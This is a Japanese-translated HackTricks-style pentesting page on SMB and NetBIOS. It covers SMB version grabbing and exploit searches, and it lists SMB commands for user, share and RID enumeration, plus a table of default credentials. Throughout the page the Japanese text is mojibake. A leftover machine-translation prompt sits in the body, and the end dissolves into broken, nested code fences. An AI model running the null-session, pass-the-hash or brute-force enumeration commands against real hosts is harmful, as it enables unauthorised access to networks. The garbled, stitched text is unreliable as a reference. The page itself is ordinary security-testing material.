# 139,445 - SMBã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## **ãƒãƒ¼ãƒˆ139**

**NetBIOS**ã¯ã€_Network Basic Input Output System_ã®ç•¥ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ã‚¨ãƒªã‚¢ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ï¼ˆLANï¼‰ä¸Šã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã€PCã€ãŠã‚ˆã³ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ã¨é€šä¿¡ã—ã€ãƒ‡ãƒ¼ã‚¿ã‚’ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§é€ä¿¡ã™ã‚‹ãŸã‚ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚NetBIOSãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€NetBIOSåã«ã‚ˆã£ã¦ç›¸äº’ã«æ¤œå‡ºãŠã‚ˆã³è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚NetBIOSåã¯æœ€å¤§16æ–‡å­—ã§ã‚ã‚Šã€é€šå¸¸ã¯ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿åã¨ã¯åˆ¥ã«ãªã£ã¦ã„ã¾ã™ã€‚2ã¤ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€1ã¤ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼‰ãŒã€Œå‘¼ã³å‡ºã—ã€ã‚³ãƒãƒ³ãƒ‰ã‚’åˆ¥ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼ˆã‚µãƒ¼ãƒãƒ¼ï¼‰ã«é€ä¿¡ã™ã‚‹ã¨ã€**TCPãƒãƒ¼ãƒˆ139**ã‚’ä»‹ã—ã¦NetBIOSã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹å§‹ã—ã¾ã™ã€‚ï¼ˆ[ã“ã“ã‹ã‚‰æŠœç²‹](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for)ï¼‰
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## ãƒãƒ¼ãƒˆ445

ãƒãƒ¼ãƒˆ139ã¯æŠ€è¡“çš„ã«ã¯ã€ŒNBT over IPã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ãŒã€ãƒãƒ¼ãƒˆ445ã¯ã€ŒSMB over IPã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚**SMB**ã¯ã€Œ**Server Message Blocks**ã€ã®ç•¥ã§ã™ã€‚ç¾ä»£ã®è¨€èªã§ã¯ã€Server Message Blockã¯ä¸€èˆ¬çš„ãªã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¨ã—ã¦ã‚‚çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ã‚·ã‚¹ãƒ†ãƒ ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒãƒ¼ãƒ‰é–“ã§ãƒ•ã‚¡ã‚¤ãƒ«ã€ãƒ—ãƒªãƒ³ã‚¿ã€ã‚·ãƒªã‚¢ãƒ«ãƒãƒ¼ãƒˆãªã©ã®å…±æœ‰ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä¸»ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ¬ã‚¤ãƒ¤ãƒ¼ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚

ãŸã¨ãˆã°ã€Windowsã§ã¯ã€SMBã¯NetBIOS over TCP/IPã‚’å¿…è¦ã¨ã›ãšã«ç›´æ¥TCP/IPä¸Šã§å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€æŒ‡æ‘˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ãƒãƒ¼ãƒˆ445ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ä»–ã®ã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€ãƒãƒ¼ãƒˆ139ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€SMBãŒNetBIOS over TCP/IPã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ï¼ˆ[ã“ã“](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for)ã‹ã‚‰æŠœç²‹ï¼‰
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

Server Message Blockï¼ˆ`SMB`ï¼‰ã¯ã€**ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå…¨ä½“ã€ãƒ—ãƒªãƒ³ã‚¿ã€ãƒ«ãƒ¼ã‚¿ãƒ¼ã€ã¾ãŸã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«å…¬é–‹ã•ã‚ŒãŸã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ãªã©ã€ä»–ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’åˆ¶å¾¡ã™ã‚‹**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µãƒ¼ãƒãƒ¼ãƒ—ãƒ­ãƒˆã‚³ãƒ«**ã§ã™ã€‚ã“ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ä¸»ãªé©ç”¨ç¯„å›²ã¯ã€ç‰¹ã«Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚·ãƒªãƒ¼ã‚ºã§ã‚ã‚Šã€ãã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã¯SMBã‚’ä¸‹ä½äº’æ›ã®æ–¹æ³•ã§ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã¤ã¾ã‚Šã€æ–°ã—ã„ã‚¨ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã‚’æ­è¼‰ã—ãŸãƒ‡ãƒã‚¤ã‚¹ã¯ã€å¤ã„Microsoftã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸãƒ‡ãƒã‚¤ã‚¹ã¨ç°¡å˜ã«é€šä¿¡ã§ãã¾ã™ã€‚\
ã¾ãŸã€ãƒ•ãƒªãƒ¼ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ã‚ã‚‹**Samba**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€**Linux**ãŠã‚ˆã³Unixãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã§SMBã‚’ä½¿ç”¨ã—ã€SMBã‚’ä»‹ã—ãŸã‚¯ãƒ­ã‚¹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®é€šä¿¡ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

SMBã‚µãƒ¼ãƒãƒ¼ã¯ã€**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®ä»»æ„ã®éƒ¨åˆ†ã‚’å…±æœ‰**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«è¡¨ç¤ºã•ã‚Œã‚‹**éšå±¤**ã¯ã€**ã‚µãƒ¼ãƒãƒ¼**ä¸Šã®**æ§‹é€ **ã¨éƒ¨åˆ†çš„ã«**ç‹¬ç«‹**ã—ã¦ã„ã¾ã™ã€‚**ã‚¢ã‚¯ã‚»ã‚¹æ¨©**ã¯ã€`Access Control Lists`ï¼ˆ`ACL`ï¼‰ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ã€å€‹ã€…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚°ãƒ«ãƒ¼ãƒ—ã«å¯¾ã—ã¦**`å®Ÿè¡Œ`**ã€**`èª­ã¿å–ã‚Š`**ã€**`å®Œå…¨ã‚¢ã‚¯ã‚»ã‚¹`**ãªã©ã®å±æ€§ã«åŸºã¥ã„ã¦**ç´°ã‹ãåˆ¶å¾¡**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ACL**ã¯**å…±æœ‰ã«åŸºã¥ã„ã¦**å®šç¾©ã•ã‚Œã‚‹ãŸã‚ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ãƒ­ãƒ¼ã‚«ãƒ«ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸæ¨©é™ã¨ã¯ç•°ãªã‚Šã¾ã™ã€‚

### IPC$ å…±æœ‰

æ›¸ç±ã€Œ_**Network Security Assessment 3rd edition**_ã€ã‚ˆã‚Š

åŒ¿åã®ãƒŒãƒ«ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€IPC$å…±æœ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€åå‰ä»˜ããƒ‘ã‚¤ãƒ—ã‚’ä»‹ã—ã¦å…¬é–‹ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã¨å¯¾è©±ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ç‰¹ã«Kali Linuxå†…ã®enum4linuxãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã¯éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚ã“ã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã®æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚

* ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®æƒ…å ±
* è¦ªãƒ‰ãƒ¡ã‚¤ãƒ³ã®è©³ç´°
* ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒªã‚¹ãƒˆ
* åˆ©ç”¨å¯èƒ½ãªSMBå…±æœ‰ã®è©³ç´°
* æœ‰åŠ¹ãªã‚·ã‚¹ãƒ†ãƒ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼

## NTLMã¨ã¯

NTLMãŒä½•ã‹ã‚ã‹ã‚‰ãªã„å ´åˆã€ã¾ãŸã¯NTLMã®å‹•ä½œæ–¹æ³•ã‚„æ‚ªç”¨æ–¹æ³•ã«ã¤ã„ã¦çŸ¥ã‚ŠãŸã„å ´åˆã¯ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ãŒéå¸¸ã«èˆˆå‘³æ·±ã„ã§ã—ã‚‡ã†ã€‚**NTLM**ã«ã¤ã„ã¦èª¬æ˜ã•ã‚Œã¦ãŠã‚Šã€**ã“ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®å‹•ä½œæ–¹æ³•ã¨åˆ©ç”¨æ–¹æ³•**ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **ã‚µãƒ¼ãƒãƒ¼åˆ—æŒ™**

### **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ã‚¹ã‚­ãƒ£ãƒ³**ã—ã¦ãƒ›ã‚¹ãƒˆã‚’æ¤œç´¢ã—ã¾ã™ï¼š
```bash
nbtscan -r 192.168.0.1/24
```
### SMBã‚µãƒ¼ãƒãƒ¼ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³

SMBãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚’æ¢ã™ãŸã‚ã«ã¯ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’çŸ¥ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚ã“ã®æƒ…å ±ãŒä»–ã®ä½¿ç”¨ãƒ„ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œãªã„å ´åˆã¯ã€æ¬¡ã®æ–¹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

* **MSF**ã®è£œåŠ©ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ« \_**auxiliary/scanner/smb/smb\_version**ã‚’ä½¿ç”¨ã™ã‚‹
* ã¾ãŸã¯ã€æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®æ¤œç´¢**

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®æ¤œç´¢ã¯ã€SMBã‚µãƒ¼ãƒ“ã‚¹ã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«é‡è¦ãªã‚¹ãƒ†ãƒƒãƒ—ã§ã™ã€‚ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ç‰¹æ®Šãªã‚³ãƒ¼ãƒ‰ã¾ãŸã¯æ‰‹æ³•ã§ã™ã€‚ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯SMBã‚µãƒ¼ãƒ“ã‚¹ã«ä¾µå…¥ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’ç›—ã‚€ã€ã‚·ã‚¹ãƒ†ãƒ ã‚’ä¹—ã£å–ã‚‹ãªã©ã®æ‚ªæ„ã®ã‚ã‚‹æ´»å‹•ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã„ã¾ã™ã€‚

1. ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æƒ…å ±ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚„ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’èª¿æŸ»ã—ã¾ã™ã€‚CVEï¼ˆCommon Vulnerabilities and Exposuresï¼‰ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ–ãƒ­ã‚°ã€ãƒ•ã‚©ãƒ¼ãƒ©ãƒ ãªã©ãŒæœ‰ç”¨ãªæƒ…å ±æºã§ã™ã€‚

2. SMBã‚µãƒ¼ãƒ“ã‚¹ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®è©³ç´°ã‚’ç‰¹å®šã—ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ã‚­ãƒ£ãƒ³ã‚„ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

3. ç‰¹å®šã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã«é–¢é€£ã™ã‚‹æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æ¤œç´¢ã—ã¾ã™ã€‚ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚³ãƒ¼ãƒ‰ã‚„æ‰‹æ³•ã¯ã€ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã‚„GitHubãªã©ã®ãƒªãƒã‚¸ãƒˆãƒªã§å…¥æ‰‹ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

4. è„†å¼±æ€§ã®è©³ç´°ã¨ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ä½¿ç”¨æ–¹æ³•ã‚’ç†è§£ã—ã€æ”»æ’ƒã®ãƒªã‚¹ã‚¯ã¨æˆåŠŸã®å¯èƒ½æ€§ã‚’è©•ä¾¡ã—ã¾ã™ã€‚

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®æ¤œç´¢ã¯ã€SMBã‚µãƒ¼ãƒ“ã‚¹ã®è„†å¼±æ€§ã‚’ç‰¹å®šã—ã€ã‚·ã‚¹ãƒ†ãƒ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ãŸã‚ã«é‡è¦ãªã‚¹ãƒ†ãƒƒãƒ—ã§ã™ã€‚ãŸã ã—ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ä½¿ç”¨ã¯æ³•çš„ãªåˆ¶ç´„ã‚„å€«ç†çš„ãªè€ƒæ…®äº‹é …ã«å¾“ã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **å¯èƒ½æ€§ã®ã‚ã‚‹**è³‡æ ¼æƒ…å ±

| **ãƒ¦ãƒ¼ã‚¶ãƒ¼å**        | **ä¸€èˆ¬çš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**                      |
| -------------------- | ----------------------------------------- |
| _(ç©ºç™½)_              | _(ç©ºç™½)_                                 |
| guest                | _(ç©ºç™½)_                                 |
| Administrator, admin | _(ç©ºç™½)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### SMBç’°å¢ƒæƒ…å ±

### æƒ…å ±ã®å–å¾—
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ãŠã‚ˆã³ãƒ­ã‚°ã‚¤ãƒ³ä¸­ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åˆ—æŒ™


# ã“ã®æƒ…å ±ã¯æ—¢ã«enum4linuxã¨enum4linux-ngã‹ã‚‰åé›†ã•ã‚Œã¦ã„ã‚‹ã¯ãšã§ã™
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åˆ—æŒ™
[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
ä»¥ä¸‹ã¯ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã«é–¢ã™ã‚‹æœ¬ã®å†…å®¹ã§ã™ã€‚æ¬¡ã®å†…å®¹ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«network-services-pentesting/pentesting-smb.mdã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±æ–‡ã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ç¿»è¨³ã‚’ä¿æŒã—ãŸã¾ã¾ã€åŒã˜ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ãŠã‚ˆã³HTMLã®æ§‹æ–‡ã‚’è¿”ã—ã¦ãã ã•ã„ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã®åå‰ã€ãƒãƒƒã‚­ãƒ³ã‚°ç”¨èªã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®åå‰ï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€'leak'ã¨ã„ã†å˜èªã€pentestingã€ãŠã‚ˆã³ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã‚¿ã‚°ãªã©ã¯ç¿»è¨³ã—ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³æ§‹æ–‡ä»¥å¤–ã®è¿½åŠ ã®å†…å®¹ã¯è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åˆ—æŒ™
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts ãƒ›ã‚¹ãƒˆå.local
run
```
```

### **Enumerating LSARPC and SAMR rpcclient**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### GUI connection from linux

#### In the terminal:

`xdg-open smb://cascade.htb/`

#### In file browser window (nautilus, thunar, etc)

`smb://friendzone.htb/general/`

## Shared Folders Enumeration

### List shared folders

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.

```bash
```markdown
## smbclientã‚³ãƒãƒ³ãƒ‰

```bash
smbclient --no-pass -L //<IP> # ãƒŒãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼
